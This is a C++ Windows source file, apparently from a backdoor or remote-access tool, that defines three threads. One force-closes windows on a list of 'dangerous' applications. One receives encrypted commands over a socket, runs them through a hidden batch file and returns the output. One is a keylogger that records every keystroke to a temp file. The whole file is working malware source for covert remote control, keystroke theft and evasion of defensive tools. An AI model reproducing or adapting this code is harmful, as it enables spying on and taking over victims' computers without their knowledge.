/*
*      Copyright 2016 Riccardo Melioli. All Rights Reserved.
*/

#include "thread.h"

DWORD WINAPI
BlockAppsThread(void* arg) {
	std::list<const char*>* dangApps = (std::list<const char*> *) arg;
	HWND app_heandler;

	while (true) {
		for (std::list<const char*>::iterator it = (*(dangApps)).begin();
			it != (*(dangApps)).end(); ++it) {

			app_heandler = FindWindow(NULL, *it);
			if (app_heandler != NULL)
				PostMessage(app_heandler, WM_CLOSE, (LPARAM)0, (WPARAM)0);
		}

		Sleep(100);
	}

}


DWORD WINAPI ClientSocketThread(void* arg) {
	const int bufferlength = 512;
	SOCKET ClientSocket = (SOCKET)((*((ClientSocketArgs*)arg)).ClientSocket);
	const char* EncryptionKey = (const char*)((*((ClientSocketArgs*)arg)).EncryptionKey);
	int iResult;

	std::string command;
	int iSendResult;
	char recvbuf[bufferlength];
	int recvbuflen = bufferlength;
	std::size_t posSubStr;
	// write the output of command in a file
	srand((unsigned int)time(0));
	std::stringstream ss;
	ss << rand(); // An integer value between 0 and RAND_MAX

	std::string fileName = ss.str();
	char tmp_path[MAX_PATH];
	GetTempPath(MAX_PATH, tmp_path);
	std::string fileBat = tmp_path;
	fileBat.append(fileName + ".bat");
	std::string fileLog = tmp_path;
	fileLog.append(fileName + ".log");
	// Receive until the peer shuts down the connection

	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		command.append(recvbuf);

		// string decryption
		if (EncryptionKey != NULL) command = EncryptDecrypt(command, EncryptionKey);

		posSubStr = command.find("---");
		if (posSubStr != std::string::npos) {

			// erase escape characters
			command.erase(posSubStr);

			std::string commandTmp = command;
			commandTmp.append(" > " + fileLog);
			std::ofstream file(fileBat.c_str());

			if (file.is_open()) {
				for (std::string::iterator it = commandTmp.begin();
					it != commandTmp.end(); ++it) {
					file << *it;
				}
				file.close();
			}

			if (ShellExecute(0, "open", fileBat.c_str(), "", 0, SW_HIDE)) {
				// Response
				command.append("  -->  ");
				std::ifstream fileResp(fileLog.c_str());
				std::string s;
				if (fileResp.is_open()) {
					while (!fileResp.eof()) {
						getline(fileResp, s);
						command.push_back('\n');
						command.append(s);
					}
				}

				// string encryption
				if (EncryptionKey != NULL) command = EncryptDecrypt(command, EncryptionKey);

				iSendResult = send(ClientSocket, command.c_str(),
					(int)strlen(command.c_str()), 0);
				fileResp.close();

			}
			else {
				iSendResult = send(ClientSocket, "error", 5, 0);
			}
			if (iSendResult == SOCKET_ERROR) {
				closesocket(ClientSocket);
				WSACleanup();
				return 1;
			}
		}
		command = "";
		command.clear();

	} while (iResult > 0);

	// remove tmp files
	remove(fileBat.c_str());
	remove(fileLog.c_str());

	// shutdown the connection
	iResult = shutdown(ClientSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		closesocket(ClientSocket);
		WSACleanup();
		return 1;
	}
	return 0;
}



DWORD WINAPI
KeyloggerThread(void* arg) {
	const char* nomeFile = (const char*)arg;
	char tmp_path[MAX_PATH];
	GetTempPath(MAX_PATH, tmp_path);
	std::string fileLog = tmp_path;
	fileLog.append(nomeFile);
	bool condSession = true;

	while (true) {
		std::ofstream file(fileLog.c_str(), std::ios::app);
		if (file.is_open()) {
			while (condSession) {
				for (int i = 0; i < 256; i++) {
					if (GetAsyncKeyState(i)) {
						file << (char)i;
						if (i == VK_RETURN || i == VK_LBUTTON) {
							condSession = false;
							break;
						}
					}
				}
				Sleep(100);
			}
		}
		file.close();
		condSession = true;
	}
}